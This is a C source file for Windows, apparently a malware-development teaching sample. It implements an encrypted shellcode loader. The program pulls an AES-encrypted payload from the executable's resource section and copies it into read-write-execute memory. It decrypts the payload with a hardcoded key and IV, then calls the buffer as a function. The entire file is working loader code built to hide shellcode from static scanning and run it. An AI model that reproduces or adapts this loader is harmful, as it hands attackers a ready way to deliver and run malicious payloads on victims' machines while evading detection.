#include <Windows.h>
#include <stdio.h>
#include "aes.h"
#include "resource.h"

// the Visual Studio project should include:
// aes.h - https://github.com/kokke/tiny-AES-c/blob/master/aes.h
// aes.c - https://github.com/kokke/tiny-AES-c/blob/master/aes.c

unsigned char pKey[] = {
		0xCC, 0xC8, 0xF9, 0xE8, 0xC6, 0x96, 0x9A, 0x23, 0xFA, 0x92, 0x28, 0x3A, 0xB5, 0x9F, 0x86, 0xD1,
		0x1F, 0x18, 0x33, 0xBB, 0xCA, 0x15, 0x7C, 0x63, 0x8C, 0xEA, 0xF0, 0x6A, 0x8A, 0xF1, 0x15, 0x91 };

unsigned char pIv[] = {
		0xC4, 0xB7, 0x66, 0xB4, 0xEA, 0x56, 0x9C, 0x1A, 0xDA, 0x5D, 0x3F, 0x4E, 0x2F, 0xCF, 0xD2, 0x10 };

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	PVOID Data = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Data != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(Data, pPayloadAddress, sPayloadSize);
	}
	else {
		// Error handling
		printf("[!] VirtualAlloc failed with error : %d \n", GetLastError());
		return -1;
	}

	// Struct needed for tiny-AES library
	struct AES_ctx ctx;

	// Initilizing the Tiny-Aes Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	printf("[i] Base Address of Encrypted Shellcode : 0x%p \n", Data);
	printf("[!] Decrypting shellcode..\n");

	// Decrypting
	AES_CBC_decrypt_buffer(&ctx, Data, sPayloadSize);

	printf("[!] Shellcode successfully decrypted!\n");

	// Printing the decrypted buffer to the console
	PrintHexData("PlainText", Data, sPayloadSize);

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)Data;

	// Call the shellcode function
	shellcodeFunc();

	// freeing
	VirtualFree(Data, 0, MEM_RELEASE);
	return 0;

}
